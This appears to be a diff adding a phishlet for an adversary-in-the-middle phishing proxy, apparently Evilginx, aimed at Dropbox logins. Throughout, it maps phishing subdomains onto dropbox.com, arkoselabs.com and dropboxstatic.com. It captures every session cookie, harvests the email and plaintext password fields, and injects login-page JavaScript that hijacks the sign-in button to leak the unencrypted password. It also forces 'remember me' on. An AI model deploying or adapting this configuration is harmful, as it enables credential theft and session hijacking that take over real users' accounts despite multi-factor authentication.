@@ -1,0 +1,86 @@
+author: '@charlesbel'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'dropbox.com', session: true, is_landing: true}
+  - {phish_sub: 'dropbox-api', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', session: false, is_landing: false}
+  - {phish_sub: 'client-api', orig_sub: 'client-api', domain: 'arkoselabs.com', session: false, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'arkoselabs.com', session: false, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'cfl', domain: 'dropboxstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'bolt', orig_sub: 'bolt', domain: 'dropbox.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'cfl', domain: 'dropboxstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'client-api', domain: 'arkoselabs.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'cdn', domain: 'arkoselabs.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'cfl', domain: 'dropboxstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: 'dropbox.com', search: '".{domain}"', replace: '".{domain}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'bolt', domain: 'dropbox.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.dropbox.com'
+    keys: ['.*,regexp']
+  - domain: 'www.dropbox.com'
+    keys: ['.*,regexp']
+  - domain: '.www.dropbox.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/page_success/end'
+
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'login_password_unenc'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.dropbox.com'
+  path: '/login'
+
+js_inject:
+  - trigger_domains: ["www.dropbox.com"]
+    trigger_paths: ["/login"]
+    trigger_params: []
+    script: |
+        let start = setInterval(function() {
+           if (document.getElementsByClassName('login-button signin-button button-primary').length) {
+              clearInterval(start);
+              let subButton = document.getElementsByClassName('login-button signin-button button-primary')[0]
+              let parent = subButton.parentElement
+              async function a(ev) {
+                  ev.stopPropagation();
+                  ev.preventDefault();
+                  if (!subButton.disabled) {
+                      var password = document.getElementsByName("login_password")[0].value;
+                      if (!password) var password = document.getElementsByName("login_password")[1].value;
+                      await fetch('/ajax_login', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: "login_password_unenc=" + encodeURIComponent(password)});
+                      parent.removeEventListener('click', a, true);
+                      ev.target.click()
+                  }
+              }
+              parent.addEventListener("click", a, true);
+              new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.type == "attributes" && mutation.attributeName == "disabled" && mutation.target.disabled == true) {
+                        parent.removeEventListener('click', a, true);
+                        parent.addEventListener("click", a, true);
+                    }
+                });
+              }).observe(document.getElementsByClassName('login-button signin-button button-primary')[0], {
+                attributes: true //configure it to listen to attribute changes
+              });
+          }
+        }, 100);
+
+force_post:
+  - path: '/ajax_login'
+    force:
+      - {key: 'remember_me', value: 'true'}
+    type: 'post'
